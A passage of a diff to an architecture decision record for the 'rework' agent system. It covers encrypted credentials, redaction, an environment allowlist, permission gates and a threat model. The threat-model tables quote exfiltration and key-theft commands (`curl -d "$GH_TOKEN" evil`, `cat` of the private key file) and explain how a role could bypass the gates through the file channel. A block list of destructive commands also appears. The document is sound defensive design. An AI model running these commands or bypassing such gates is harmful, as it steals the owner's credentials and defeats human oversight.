 never by a model. Actions: `use` (started/finished pair), `ask`, `grant`, `deny`,
 `unavailable`, `create`, `rotate`, `retire`, `policy_change`, `chat_intercept`. Rows hold
 who (`role`, `run_id`, `model`, `actor`), what (`subject_*`, redacted `command`,
 `env_name`), the decision (`outcome`, `rule_id`, `gate_id`) and the result (`exit_code`).
-They never hold a value, a fingerprint of one, or its length. The TUI shows the trail
-(section 9); `rework permissions log [--item NAME] [--mission ID]` shows it in a shell.
+Outcomes are `started`, `finished`, `allowed`, `denied`, `timed_out` and `unavailable`.
+They never hold a value, a fingerprint of one, or its length. `rework permissions log
+[--item NAME] [--mission ID]` shows the trail in a shell from phase 1; the TUI view
+(section 9) is phase 3.
 
 ### 8. The destructive-command policy
 
@@ -772,7 +986,7 @@ Docker executor, which this ADR does not replace.
 | `terraform apply`, `terraform destroy` | parsed |
 | `docker rm`, `docker rmi`, `docker system prune` | parsed |
 | `systemctl stop`, `systemctl restart` | parsed |
-| `rework update --target` (`cli/__init__.py:1543-1546`) | parsed |
+| `rework update --target` (`cli/__init__.py:1543-1548`) | parsed |
 | `ssh` / `scp` to a host not in the allowed-hosts list | parsed (host extraction) |
 | `npm publish`, `twine upload`, `gh release create` | parsed |
 
@@ -811,10 +1025,14 @@ cannot see these, and the documentation says so; the owner who needs them covere
 (`{"kind": "argv", "argv": ["git","push"], "flags_any": ["-f","--force"]}` or
 `{"kind": "sql", "verbs": ["DROP","TRUNCATE","DELETE"], "clients": ["psql","sqlite3","mysql"]}`)
 and `effect=ask` by default. The owner can disable, change to `deny`, edit, or add rules
-(TUI, section 9; `rework permissions rules`), and set the allowed ssh/scp hosts (stored as `allowed_hosts` in the matcher of
-the `ssh`/`scp` rule; default empty, so even rewvis itself asks; `targets.toml` hosts, `targets.py:55`, are not
-auto-allowed). `rework permissions reset-defaults` restores missing default rows without
-touching owner edits. The command policy's "role's worktree" is the executor's `workdir`
+(CLI from phase 2: `rework permissions list --commands|edit`, with `retire` available since phase 1; TUI editor in phase 3,
+section 9), and set the allowed ssh/scp hosts (stored as `allowed_hosts` in the matcher of
+the `ssh`/`scp` rule; default empty, so even rewvis itself asks; the `ssh` host of a
+target in `targets.toml`, `targets.py:55`, is not auto-allowed). `rework permissions
+reset-defaults` restores missing default rows without touching owner edits;
+`--repair` also replaces a *malformed* default row from the shipped seed (section 6).
+A malformed or unreadable command rule never silently disappears: it asks or denies
+(section 6). The command policy's "role's worktree" is the executor's `workdir`
 (`nodes/tools.py:210`). The engine's own mechanical pushes (`_deliver_branch`, `_create_pr`) are trusted code,
 not `run_command`, so this policy does not apply to them; they get the content scan of
 section 5 instead.
@@ -848,8 +1066,8 @@ anywhere, for anyone.
 - **Policy editor.** A form over the rule (section 6): approval mode as a select
   (`never`, `first use per mission`, `every use`), effect, and projects / roles / models /
   providers / missions as pick-lists with an explicit "any". It previews the sentence the
-  gate will show. The same editor serves skills, tools and the command rules (phase 3 for
-  the latter two types).
+  gate will show. The same editor serves skills and tools (evaluated from phase 3) and the command rules
+  (editable by CLI from phase 2; this editor for them arrives in phase 3).
 - **Usage log.** A tab of `permission_audit` rows for the selected item (time, mission,
   role, redacted command, outcome), live like the other views (`Hub.guard`, ADR 0006).
 - **Locked banner.** When the daemon reports a locked vault the Library view shows it.
@@ -859,9 +1077,10 @@ anywhere, for anyone.
   would otherwise be in `chat_messages`). A modal offers: *Save as credential* (opens the
   masked form with the matched token prefilled and a name/policy to fill), *It's not a
   secret* (sends, with a `chat_intercept` audit row), *Cancel*. The same check guards gate
-  answers typed in `tui/views/gates.py`. `OrchestratorChat.send` repeats the check as a
-  backstop for other front-ends and returns an error rather than sending. Images cannot be
-  scanned (limit).
+  answers typed in `tui/views/gates.py`. `OrchestratorChat.send` runs the same check itself
+  and returns an error (pointing at `rework credential add`) rather than sending: that
+  backstop covers every front-end and ships in phase 1, and the TUI modal above, which
+  makes it graceful, is phase 3. Images cannot be scanned (limit).
 
 ### 10. Provider API keys are out of scope
 
@@ -870,12 +1089,17 @@ Provider keys stay where they are: `api_key_env` in `models.json`
 (`config.py:20-46`) and synced to targets by `rework sync-config`
 (`cli/__init__.py:1586-1598`). **This design does not move provider keys into the Library, does
 not encrypt them, and does not put them behind the permission system.** Credentials are
-what agents use for their tasks; provider keys are what rework uses to run agents. The one
-interaction is defensive: provider key values are loaded into the redactor as redact-only
-needles (section 5), so an agent that prints one still cannot persist it. One existing
-fact is recorded, not fixed here: `role_env` copies the daemon's whole environment
-(`nodes/tools.py:308`), so every `run_command` can read the provider keys the daemon
-loaded. Scrubbing them from `role_env` is a separate, small decision (Alternatives).
+what agents use for their tasks; provider keys are what rework uses to run agents. There are two
+interactions, both subtractive or defensive. (1) The section 4 allowlist removes provider
+keys from the environment of role commands: `load_env_file` copies `rework.env` into
+`os.environ` (`config.py:44-45`) and the adapters read the keys from there
+(`kernel/llm/adapters/__init__.py:39-45`), but `role_env` no longer passes them on. That
+is subtraction only: the keys are still in `models.json`/`rework.env` and the daemon's own
+environment, not in the Library, not encrypted, not behind the permission system. The
+`rework.env` file itself stays readable to a role (the file channel, section 11).
+(2) Provider key values are also loaded into the redactor as redact-only needles
+(section 5): belt-and-braces now, since the environment is no longer the way an agent
+sees them, but they still stop an agent that read one from a file from persisting it.
 
 ### 11. Threat model
 
@@ -890,16 +1114,17 @@ around the sanctioned path is in the second table, first.
 | values in logs, events, artifacts, reports, PR bodies, transcripts that rework's own processes write on the daemon host | redaction at the choke points in section 5 (by value there; shape rules only off-host, section 5) |
 | a value reaching the mirrored library repo through `contribute` | credentials skip `write_body`; `contribute` redacts everything else |
 | an agent that uses the **sanctioned path** (`run_command credentials=[...]`) outside its scope or without approval | the engine evaluates policy, opens gates and writes audit rows on that path, failing closed. It does not stop an agent that bypasses the path (first row below) |
+| a role command reading the daemon's **environment** (`printenv`, `echo $REWORK_ANTHROPIC_KEY`, `$REWORK_DB` with its password, an exported token) | `role_env` is an allowlist and drops everything else (section 4, phase 1; named test `test_role_command_cannot_see_provider_keys_or_db`). Environment channel only: the file channel is the first row below |
 | an accidental destructive command | the command policy asks (a speed bump, section 8) |
 | a *forgotten* sanctioned use | every sanctioned use has an audit row; audit failure denies |
 | accidental corruption, or an envelope copied between credential rows | AEAD with the item id in the AAD turns it into `unavailable: corrupt`, never another credential's value. It is **not** a defence against a deliberate DB writer (below) |
 
 | does **not** protect against | why |
 |---|---|
-| **any role, today, bypassing the whole system by reading the key and the database** | roles run as the daemon's OS user with its whole environment, under an advisory jail (`nodes/tools.py:131-134`, `:291`, `:308`). One `run_command` can `cat ~/.rework/keys/credentials.key`, find the DB (`REWORK_DB`, `config.py:91`) and decrypt every credential: no policy check, no gate, no audit row. The `env.setdefault` redirects in `role_env` (`:316-323`) hide nothing. **Until a Docker executor (M7) or a separate OS user owns the key, the permission system governs well-behaved agents and mistakes, not a hostile or manipulated role.** An advisory deny rule on the key path (section 3) is a speed bump only |
+| **any role, today, bypassing the whole system by reading the key and the database** | roles run as the daemon's OS user under an advisory jail (`nodes/tools.py:131-134`). The phase-1 allowlist (section 4) closes the **environment** channel; the **file** channel stays open. One `run_command` can `cat ~/.rework/keys/credentials.key`, find the DB (the default sqlite path, `config.py:68-69`, `:91`, or a Postgres URL kept in a file such as `~/.rework/rework.env`) and decrypt every credential: no policy check, no gate, no audit row. The same channel exposes any token a tool keeps on disk under `HOME` (`gh`'s own login, `~/.ssh` keys). The scratch redirects in `role_env` (`:319-323`) hide nothing on disk. **Until a Docker executor (M7) or a separate OS user owns the key, the permission system governs well-behaved agents and mistakes, not a hostile or manipulated role.** An advisory deny rule on the key path (section 3) is a speed bump only |
 | **anyone who can write the database** (the daemon's own DB credentials, a role that finds them, a compromised TUI machine with store access, a `pg_dump` restore into the live DB) | they can insert or edit `permission_policies` (grant themselves allow/`never`), insert `permission_grants`, flip a gate decision (`gates` is just a table; `tui/data.py:302` is a plain `store.decide_gate`), edit or delete `permission_audit` rows (append-only is a property of the store *interface*, not a database constraint), replace the active public key, and, because the public key is public and ECIES has no sender authentication, write a valid envelope of their own value into any credential (so `github-token` can silently become the attacker's token). They cannot read existing values without the private key. The TUI's fingerprint pin catches a public-key swap only on a machine that pinned it; `rotated_at`/`updated_by` make an unexpected rotation *visible* to an owner who looks, not impossible; owner-signed envelopes and DB-level append-only triggers are possible hardening and are not designed here |
 | a compromised rewvis host or a root user there | the private key and the decrypted values are in reach |
-| an agent exfiltrating a value through a command it is allowed to run (`curl -d "$GH_TOKEN" evil`, `printenv > file`) | the command has the plaintext; `every_use` shows the owner the exact command, and the pre-push scan catches committed files on the two engine push paths only (section 5), but policy cannot read intent |
+| an agent exfiltrating a value through a command it is allowed to run (`curl -d "$GH_TOKEN" evil`, `printenv > file`) | the command has the plaintext; `every_use` shows the owner the exact command, and the pre-push scan (phase 2) catches committed files on the two engine push paths only (section 5), but policy cannot read intent |
 | the plaintext env var inside the child process | readable via `/proc/<pid>/environ` by the same user, and inherited by descendants and background jobs |
 | plaintext in the daemon's memory | resident for the daemon's lifetime in the redactor's needle set and non-zeroable; the exact statement is in section 4 |
 | text typed on a host that holds no values | a pasted secret in Mac-side chat is protected only by the detector (section 5); redaction by value cannot exist there |
@@ -909,7 +1134,8 @@ around the sanctioned path is in the second table, first.
 | a hostile DB writer substituting the public key before a new value is entered | the TUI pins the fingerprint; the first use on a new machine is trust-on-first-use |
 | shell-string tricks against the command policy | section 8; script indirection is invisible to it |
 | a skill or tool body already served, or read from the DB or git mirror directly | section 6: the scope controls who is *served* a body at `library_read` and MCP `get`, nothing more |
-| the model provider keys | out of scope (section 10), and still inherited by `role_env` |
+| `role_env.toml` entries | an owner entry makes that variable visible to every role command, by the owner's choice (the daemon warns when it names a known secret, section 4); the file is under `~/.rework`, so a role running as the daemon user could edit it, which is the file channel again |
+| the model provider keys, on disk | out of scope (section 10); no longer in a role's environment (section 4), but `rework.env` is a readable file |
 
 ### 12. Migration
 
@@ -919,6 +1145,14 @@ around the sanctioned path is in the second table, first.
   Phase 2 adds `permission_grants` and seeds the default command rules; phase 3 seeds the
   skill/tool default rules (below). Each phase's tables are created by that phase's own
   `CREATE TABLE IF NOT EXISTS`, so an earlier phase never references a later one.
+  `role_env.toml` is an optional file, not a table.
+- **The role environment allowlist is a behaviour change, not additive** (phase 1). Order:
+  (1) update; (2) run `rework role-env show` (names, never values, of the variables in the CLI's own
+  environment and `rework.env` that role commands will no longer see; the daemon's start-up
+  log line lists what the daemon itself dropped, section 4); (3) for each one a role legitimately
+  needs, either register it as a credential or add it to `role_env.toml` (section 4,
+  point f lists what is known to need this). Rollback of the allowlist is reverting the
+  code: there is no `inherit_all` setting, on purpose.
 - **Both stores, additive.** Everything is `CREATE TABLE IF NOT EXISTS`; no existing
   table gets a column, so the check-then-alter lists (`_MIGRATIONS` at
   `library/store.py:49`, `_SQLITE_MIGRATIONS` at `:60`) are untouched. `gates` is
@@ -938,23 +1172,32 @@ around the sanctioned path is in the second table, first.
   same change that starts evaluating them, so current behaviour is preserved.
 - **Default command rules** are seeded in phase 2 (the phase that evaluates command
   policy) once with `source='default'`; re-running the seed inserts only missing ids.
-- **Rollback.** Dropping the new tables restores today's behaviour; credential items
-  without their tables become `unavailable`, never an error in listings.
+- **Rollback.** Dropping the new tables restores today's Library and policy behaviour;
+  credential items without their tables become `unavailable`, never an error in listings.
+  The environment allowlist is code, not a table, and is not undone by dropping tables.
 
 ### 13. Phased implementation plan
 
-**Phase 1: storage, encryption, injection, redaction, audit, and a minimal owner-written
-allow/deny policy.** Self-contained: it depends on nothing from phase 2. Lands:
-`ItemType.CREDENTIAL` and tolerant `_row_to_item`; `credential_keys`, `credentials`,
+**Phase 1: the role-environment allowlist, storage, encryption, injection, redaction, audit,
+and a minimal owner-written allow/deny policy.** Self-contained: it depends on nothing from
+phase 2 or 3. Lands: **the role-environment allowlist (section 4: `role_env` rebuilt from
+the baseline plus `~/.rework/role_env.toml`, `rework role-env show|allow`)**, which needs
+neither a key nor a credential; `ItemType.CREDENTIAL` and tolerant `_row_to_item`. The
+allowlist and the tolerant-`_row_to_item` commit (section 12) are independent: either may
+land first, neither needs the other, and no credential is created until both have shipped; `credential_keys`, `credentials`,
 `permission_policies` and `permission_audit` in both stores; `rework keys
-init|export|import|fingerprint`; the envelope and `CredentialVault`; `credential_add`/
-`rotate` for the CLI; the `Redactor` and every hook in section 5; `PermissionExecutor`
-(outermost, section 4) evaluating **steps 1-3 of section 6 and approval `never` only**;
-the `credentials` argument on `run_command`; the audit writes; `cryptography` as a direct
-dependency. **Where phase 1's rule comes from:** the owner writes it, with `rework
-credential add NAME --env GH_TOKEN --allow --roles coder --projects p-ab12` (value read
-by masked `getpass`; every scope dimension must be given or explicitly `any`) and `rework
-permissions allow|deny|list`. Both write `permission_policies` rows with `effect`
+init|export|import|fingerprint`; the envelope and `CredentialVault`; `rework credential
+add|rotate|retire|list` for the CLI; the `Redactor`, the secret detector with its
+`OrchestratorChat.send` backstop (an error, no modal), and every hook in section 5 except
+the TUI render hook (phase 3); `PermissionExecutor` (outermost, section 4) evaluating
+**steps 1-3 of section 6 and approval `never` only**; the `credentials` argument on
+`run_command` and the per-call `ContextVar` that carries the value to the spawn site; the
+audit writes; `cryptography` as a direct dependency. **Where phase 1's rule comes from:** the owner writes it, with `rework
+credential add NAME --env GH_TOKEN --allow --roles coder --projects p-ab12 --models any
+--providers any --missions any` (value read by masked `getpass`; all five scope dimensions
+must be given or explicitly `any`) and `rework permissions allow|deny|list [--malformed]|retire|log`
+(`retire` and `list --malformed` are here so that a malformed phase 1 rule, section 6, can be
+repaired without waiting for phase 2). Both write `permission_policies` rows with `effect`
 allow/deny and `approval=never`. A rule with `ask` or another approval mode is stored but
 evaluated as **deny** ("approval modes arrive in phase 2"), so phase 1 never allows more
 than the owner wrote. There are no gates, grants, command rules, agent proposals
@@ -974,7 +1217,9 @@ Tests (SQLite and Postgres via the store conformance suite):
   `test_missing_scope_key_rejected_on_save`, `test_malformed_allow_rule_non_matching`,
   `test_malformed_deny_rule_matches_everything` (fails closed toward deny),
   `test_wildcard_sentinel_matches_any_item_and_null_is_malformed`,
-  `test_non_never_approval_denied_in_phase1`, `test_policy_db_error_denies`.
+  `test_non_never_approval_denied_in_phase1`, `test_policy_db_error_denies`,
+  `test_permissions_retire_repairs_malformed_rule`,
+  `test_pinned_fingerprint_mismatch_refuses_encrypt`.
 - Redaction: `test_redact_exact`, `_base64_all_alignments`, `_hex`, `_url_encoded`,
   `_json_escaped`, `_partial_head_tail`, `_short_value_exact_only`,
   `_binary_output_bytes_pass`, `_redacts_before_truncation` (value straddling the 4000
@@ -991,25 +1236,72 @@ Tests (SQLite and Postgres via the store conformance suite):
   published on the bus: the `events` row and what subscribers receive are clean);
   `test_json_and_console_log_formatters_redact` (message and exception text, valid JSON
   line); `test_save_loop_transcript_redacted` (the on-disk loop file).
-- Injection: `test_env_var_only_for_target_command` (a second command in the same role
-  does not see it), `test_env_var_absent_from_transcript_events_logs_chat`,
+- **Role environment (owner requirement; both are named, mandatory, and block the phase):**
+  - `test_role_command_cannot_see_provider_keys_or_db`: through the real
+    `PermissionExecutor` over a real `LocalExecutor` (a repo with a `pyproject.toml` and a
+    plain repo, because they take different branches in `role_env`), set
+    `REWORK_ANTHROPIC_KEY`, `REWORK_FIREWORKS_KEY`, `REWORK_DB=postgresql://u:pw@h/db`,
+    `REWORK_TOKEN`, `GH_TOKEN` and an arbitrary `FOO_SECRET` in the daemon's environment;
+    the role's `run_command` of `printenv` returns none of those names and none of those
+    values, and still returns `PATH` and `HOME` (the test is not vacuous: the command ran).
+    It asserts on the **names** as well as the values and runs without the `Redactor`
+    installed: the redactor holds the provider keys as needles (section 5) and would mask a
+    leaked value, hiding exactly the failure this test exists to catch.
+    Negative control, per the repo's practice: temporarily restore `env =
+    dict(os.environ)` in `role_env` and confirm the test goes red.
+  - `test_injected_credential_visible_only_in_the_granted_call`: call 1,
+    `run_command("[ -n \"$GH_TOKEN\" ] && echo present || echo absent",
+    credentials=["github-token"])` returns `present`; call 2, the same command in the
+    same role without `credentials`, returns `absent`; and call 1 with `printenv GH_TOKEN`
+    returns the `[REDACTED:github-token]` marker, never the value. (It replaces the
+    earlier `test_env_var_only_for_target_command`.)
+  - Allowlist unit tests: `test_role_env_baseline_names_pass_everything_else_dropped`;
+    `test_role_env_has_no_fallthrough_when_the_owner_file_is_missing_or_invalid` (missing,
+    unreadable, bad TOML, bare `*`, short prefix: baseline only, never the parent
+    environment); `test_role_env_owner_list_exact_and_prefix_entries`;
+    `test_role_env_allowlist_applies_to_a_repo_without_pyproject` (the early-return
+    branch); `test_role_env_scratch_redirects_are_set_not_inherited` (a daemon that
+    exported `REWORK_LOG_DIR` does not leak it); `test_credential_env_name_on_the_allowlist_refused`
+    and `..._unavailable_when_allowlist_edited_later`;
+    `test_a_plain_repo_keeps_the_daemons_tools` rewritten to assert the tools come through
+    `PATH`, not `VIRTUAL_ENV`.
+  - `test_chat_send_refuses_pasted_secret` (fake provider: zero calls, no `chat_messages`
+    row).
+- Injection: `test_env_var_absent_from_transcript_events_logs_chat`,
   `test_value_not_in_command_registry_file`, `test_reserved_env_name_refused`,
   `test_audit_rows_started_finished`, `test_audit_write_failure_denies`,
-  `test_plaintext_dropped_after_call` (the wrapper holds no reference after return).
+  `test_plaintext_dropped_after_call` (the wrapper's local and the `ContextVar` hold no
+  reference after return, on the success, timeout and exception paths).
 - `test_no_secret_in_any_choke_point`: run a mission fixture whose command prints the
   value and assert it is absent from `events`, `runs.artifact`, `chat_messages`, log
   files, `_save_loop` output, and the rendered report.
 
-Exit: all of the above green on both backends, plus a live run on rewvis where the owner
-adds a real token with the CLI command above (phase 1 only), a coder's `gh` call
-succeeds with `credentials=['github-token']`, and the owner confirms the token appears
-nowhere.
+Exit: all of the above green on both backends, plus a live run on rewvis with phase 1
+only, **reconciled with the allowlist** (an exported `GH_TOKEN` stops reaching role
+commands, so "a coder's `gh` call works" cannot be the starting assumption). In order:
+(1) before updating, the owner notes whether a role's `gh pr list` works today and how
+`gh` is authenticated (`gh auth status` says whether the token comes from `GH_TOKEN` in
+the environment or from gh's own config under `HOME`); (2) after updating, a role's
+`printenv` shows no `REWORK_*_KEY` and no `REWORK_DB`, `rework role-env show`, run in the environment the daemon was started from (or the daemon's
+start-up log line), lists `GH_TOKEN` among the dropped names if it was exported, and a role's `gh pr list` *without*
+credentials now fails if the token came only from `GH_TOKEN` (that failure is the expected
+result and the owner's confirmation that the channel is closed); (3) the owner adds the
+token with the CLI command above, a coder's `gh pr list` succeeds with
+`credentials=['github-token']`, and the very next call without it fails again; (4) if `gh`
+is logged in through its own config file instead, step 3 would prove nothing (HOME is
+allowlisted, so it works with no credential and no audit row: the file channel), so the
+check is repeated with `GH_CONFIG_DIR=$(mktemp -d)` prefixed to the command, which hides
+the file login and leaves the injected token as the only credential; (5) the owner confirms
+the token appears nowhere.
 
 **Phase 2: approval modes, gates, destructive commands, agent proposals, push scan.**
 Lands: `permission_grants`; steps 4-5 and the combining rule of section 6 (`ask`,
 `first_use_per_mission`, `every_use`); the gate path with `spec` payload, `call_key`
 replay safety, timeout and the `actor` tripwire; `credential_propose` (agent proposes name,
-description and policy; owner confirms through the gate; owner then enters the value);
+description and policy; owner confirms through the gate on the existing Allow / Deny
+screen; owner then enters the value with `rework credential rotate NAME`, the masked TUI
+field being phase 3); the CLI `rework permissions edit|reset-defaults [--repair]` and
+`list --commands` (`retire` and `list --malformed` already exist from phase 1);
 the command policy with parsing, defaults seeding, ambiguity rule, editing via CLI; the
 pre-push scan on both engine push paths.
 
@@ -1024,6 +1316,19 @@ a consumed gate is not reused for the next identical command),
 `test_orchestrator_toolset_has_no_gate_deciding_tool`,
 `test_permission_gate_spec_shape_both_stores`, `test_agent_proposed_credential_needs_gate`,
 `test_proposed_policy_row_never_evaluated_until_active`.
+Fail-closed command policy (section 6, step 5): `test_malformed_command_ask_rule_still_asks`
+(the seeded `git push --force` rule with a corrupt matcher: an unrelated `ls` opens a
+gate naming the malformed rule, and nothing runs before the decision),
+`test_malformed_command_deny_rule_denies`,
+`test_command_rule_read_error_denies_even_a_plain_ls` (a store that raises on the command
+rule query: `denied: command policy unreadable`, no process spawned, no cached rules
+used), `test_empty_command_rules_after_successful_read_allows` (the contrast),
+`test_malformed_command_rule_with_unreadable_effect_denies`,
+`test_reset_defaults_repair_replaces_malformed_default_row`.
+Denial is not sticky (section 7): `test_denied_gate_does_not_stick_retry_asks_again`,
+`test_timed_out_gate_retry_asks_again`,
+`test_decided_deny_without_terminal_row_is_reused_on_replay` (crash between decision and
+audit row: the denial is honoured, no second gate), `test_deny_note_returned_to_model`.
 Command policy: `test_git_push_force_asks`, `_push_to_main_asks`, `_reset_hard_pushed_asks`,
 `_delete_remote_branch_asks`, `_rm_rf_outside_workdir_asks`, `_rm_rf_inside_workdir_passes`,
 `_delete_without_where_asks`, `_delete_with_where_passes`, `_kubectl_terraform_docker_
@@ -1043,7 +1348,8 @@ engine at the two body-serving points of section 6 (`library_read` through
 `PermissionExecutor`, MCP `get` through the policy callback); the default skill/tool
 rules; the activation gate for tools (`library/curation.py:3-7`) becomes a policy row
 rather than a special case; the TUI work of section 9 (masked field, rotate, policy editor,
-usage log, locked banner, chat interception).
+usage log, locked banner, the chat-interception modal on top of the phase-1 backstop, and
+the TUI render-time redaction hook).
 
 Tests: `test_skill_scope_denies_other_role_at_use_not_at_search` (skill scoped to
 `auditor`: as `coder`, `library_search` still lists it, `library_read` returns `denied:`,
@@ -1078,8 +1384,21 @@ Postgres (`REWORK_TEST_POSTGRES`), ADR status moved to Accepted with amendments.
   secret in the same place. Left to the owner as an export-only wrapper (`keys export`).
 - **Cloud KMS or Vault.** Stronger, and a new service for a one-owner system. Not now.
 - **Policy on `gates` columns.** Rejected for `spec` (section 7).
-- **Scrub provider keys from `role_env`.** Cheap and valuable; outside the settled scope,
-  so listed for a later decision. Phase 1 does not depend on it.
+- **Scrub only the provider keys, or drop variables whose names look secret (`*_KEY`,
+  `*TOKEN*`), from an inherited environment.** Rejected (owner, second audit round). A
+  denylist or a looks-like-a-secret heuristic fails open on every name it did not
+  anticipate (`GH_TOKEN`, a cloud key, a password inside a URL such as `REWORK_DB`), and
+  it is no smaller a change than building the environment from an allowlist, which fails
+  closed. An earlier draft recorded the inheritance as a known gap and parked scrubbing
+  here; section 4 supersedes that.
+- **An `inherit_all` switch (or a parent-environment fallback when `role_env.toml` is
+  broken) for owners whose commands break.** Rejected: a fail-open knob that a hand edit
+  or a parse error can turn on. The owner's list can only add names one at a time.
+- **Moving provider keys into the Library so they are injected like credentials.**
+  Rejected: settled decision 6. The allowlist only removes them from role environments.
+- **Make a denied or timed-out gate sticky for the rest of the run** (do not count it in
+  `k`). Rejected in section 7: it turns an owner's absence into a permanent refusal; the
+  standing no is a `deny` rule.
 - **Deny-by-default for every unparseable command instead of ask.** Safer on paper, but
   unusable (legitimate `python -c` is common); asking matches the owner's rule.
 - **Entropy-based redaction of outputs.** Rejected: destroys SHAs and hashes.
@@ -1102,4 +1421,12 @@ Postgres (`REWORK_TEST_POSTGRES`), ADR status moved to Accepted with amendments.
   every tool result; matching is one compiled regex pass, linear in output size.
 - A credential type in the enum is a compatibility event for old binaries; the phase-1
   ordering in section 12 exists for it.
+- Role commands no longer inherit the daemon's environment. This is a breaking change for
+  anything that relied on an inherited variable (an exported `GH_TOKEN`, proxy variables,
+  `SSH_AUTH_SOCK`, `REWORK_TEST_POSTGRES`, the `rework` CLI's `REWORK_DB`/`REWORK_TOKEN`);
+  the owner moves each into a credential or `role_env.toml` (section 4, point f). In
+  exchange the environment channel is closed by construction, not by redaction.
+- Closing the environment channel does not close the file channel (section 11).
+- A denied or timed-out permission gate asks again on a retry; the owner's standing no is
+  a `deny` rule.
 - The advisory jail is still advisory. Real isolation remains the Docker executor (M7).
